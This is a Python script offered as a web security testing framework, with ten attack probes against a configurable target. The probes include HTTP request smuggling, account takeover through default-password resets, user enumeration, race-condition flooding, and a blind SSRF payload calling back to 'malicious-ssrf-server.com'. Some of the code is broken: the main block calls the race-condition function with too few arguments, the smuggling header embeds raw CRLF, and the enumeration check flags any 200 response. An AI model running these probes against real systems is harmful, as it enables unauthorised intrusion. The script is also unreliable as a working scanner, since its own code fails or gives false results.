######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner "Yet"
# python web_security_framework.py. Note, script require BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace /example_endpoint with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################

import requests
import threading
from urllib.parse import urljoin, urlencode
from bs4 import BeautifulSoup


def display_splash_screen():
    splash = """
    
  
 __      __      ___.       _________                          .__  __           ___________                                                __                  _____ .__         .__        _____           _______  ____  
/  \    /  \ ____\_ |__    /   _____/ ____   ____  __ _________|__|/  |_ ___.__. \_   _____/___________    _____   ______  _  _____________|  | __             /  |  ||  | ______ |  |__    /  |  |          \   _  \/_   | 
\   \/\/   // __ \| __ \   \_____  \_/ __ \_/ ___\|  |  \_  __ \  \   __<   |  |  |    __) \_  __ \__  \  /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  ||  | \____ \|  |  \  /   |  |_  ______ /  /_\  \|   | 
 \        /\  ___/| \_\ \  /        \  ___/\  \___|  |  /|  | \/  ||  |  \___  |  |     \   |  | \// __ \|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /  |_|  |_> >   Y  \/    ^   / /_____/ \  \_/   \   | 
  \__/\  /  \___  >___  / /_______  /\___  >\___  >____/ |__|  |__||__|  / ____|  \___  /   |__|  (____  /__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   ||____/   __/|___|  /\____   |           \_____  /___| 
       \/       \/    \/          \/     \/     \/                       \/           \/               \/      \/     \/                        \/                |__|     |__|        \/      |__|                 \/     

 
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Web Security Framework 41PH4-01\n")
    
# Global settings
TARGET_URL = "http://example.com"  # Replace with actual target
SESSION = requests.Session()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
}

### Additional Advanced Attack Modules ###

### 1. Race Condition (TOCTOU) ###
def test_race_condition(url, param_name, value):
    def send_request():
        data = {param_name: value}
        response = SESSION.post(url, data=data, headers=HEADERS)
        print(f"Race Condition Attempt - Status: {response.status_code}")

    threads = []
    for _ in range(10):  # 10 simultaneous requests
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()


### 2. Business Logic Vulnerability ###
def test_business_logic(url, param_name):
    # Placeholder: Logic here depends heavily on application structure
    params = {param_name: "discount_code"}
    response = SESSION.get(url, params=params, headers=HEADERS)

    if "discount applied" in response.text:
        print("Potential business logic vulnerability found")
    else:
        print("No business logic vulnerability detected")


### 3. User Enumeration ###
def test_user_enumeration(url, username_param):
    usernames = ["admin", "user1", "nonexistentuser"]

    for username in usernames:
        params = {username_param: username}
        response = SESSION.post(url, data=params, headers=HEADERS)
        
        if "invalid" in response.text.lower() or response.status_code == 200:
            print(f"User enumeration detected with username: {username}")
        else:
            print(f"No user enumeration detected for username: {username}")


### 4. HTTP Smuggling ###
def test_http_smuggling(url):
    smuggling_payload = "GET / HTTP/1.1\r\nHost: vulnerable.com\r\n\r\n"
    headers = HEADERS.copy()
    headers["Content-Length"] = "0\r\n\r\n" + smuggling_payload
    response = SESSION.post(url, headers=headers)
    
    if response.status_code == 400:
        print("Potential HTTP Smuggling vulnerability found!")
    else:
        print("No HTTP Smuggling vulnerability detected")


### 5. Reflected File Download (RFD) ###
def test_reflected_file_download(url, param_name):
    payload = "filename=malicious.js"
    params = {param_name: payload}
    full_url = f"{url}?{urlencode(params)}"
    response = SESSION.get(full_url, headers=HEADERS)

    if "Content-Disposition" in response.headers and "attachment" in response.headers["Content-Disposition"]:
        print(f"Reflected File Download vulnerability found with payload: {payload}")
    else:
        print(f"Tested RFD payload: {payload} - No vulnerability detected")


### 6. Account Takeover ###
def test_account_takeover(url, reset_param):
    reset_payloads = ["defaultpassword", "password123"]

    for payload in reset_payloads:
        params = {reset_param: payload}
        response = SESSION.post(url, data=params, headers=HEADERS)
        
        if "reset successful" in response.text:
            print(f"Account takeover possible with payload: {payload}")
        else:
            print(f"Tested account takeover payload: {payload} - No vulnerability detected")


### 7. DNS Rebinding and Blind SSRF ###
def test_blind_ssrf(url, param_name):
    # Placeholder for blind SSRF test
    payload = "http://malicious-ssrf-server.com/uniqueid"
    params = {param_name: payload}
    response = SESSION.get(url, params=params, headers=HEADERS)
    print("Blind SSRF payload sent. Check the SSRF server logs for callbacks.")


### 8. Memory Corruption in Web Components ###
def test_memory_corruption(url):
    # Placeholder - would need more application-specific and OS-level testing tools
    print("Memory Corruption tests are complex and require specialised tools; manual follow-up is recommended")


### 9. Subdomain Takeover ###
def test_subdomain_takeover(domain):
    subdomains = ["test", "staging", "dev"]
    for subdomain in subdomains:
        full_url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(full_url, headers=HEADERS)
            if response.status_code == 404:
                print(f"Potential subdomain takeover found for {full_url}")
        except requests.ConnectionError:
            print(f"{full_url} - Subdomain potentially available for takeover")


### 10. CORS Misconfigurations ###
def test_cors_misconfiguration(url):
    headers = HEADERS.copy()
    headers["Origin"] = "http://evil.com"
    response = SESSION.get(url, headers=headers)
    
    if "Access-Control-Allow-Origin" in response.headers:
        allowed_origin = response.headers["Access-Control-Allow-Origin"]
        if allowed_origin == "*":
            print("CORS Misconfiguration: Open wildcard detected")
        elif "evil.com" in allowed_origin:
            print(f"CORS Misconfiguration: Untrusted origin {allowed_origin} is allowed!")
        else:
            print("CORS seems correctly configured")
    else:
        print("No CORS Misconfiguration detected")


### Main Script ###
if __name__ == "__main__":
    # Step 1: Map the Application (assuming function exists)
    # urls = map_application(TARGET_URL)
    # print("Mapped URLs:", urls)

    # Step 2: Run All Tests

    # Race Condition
    test_race_condition(TARGET_URL, "order")

    # Business Logic
    test_business_logic(TARGET_URL, "promo_code")

    # User Enumeration
    test_user_enumeration(TARGET_URL, "username")

    # HTTP Smuggling
    test_http_smuggling(TARGET_URL)

    # Reflected File Download (RFD)
    test_reflected_file_download(TARGET_URL, "file")

    # Account Takeover
    test_account_takeover(TARGET_URL, "reset")

    # Blind SSRF
    test_blind_ssrf(TARGET_URL, "url")

    # Memory Corruption
    test_memory_corruption(TARGET_URL)

    # Subdomain Takeover
    test_subdomain_takeover("example.com")

    # CORS Misconfiguration
    test_cors_misconfiguration(TARGET_URL)
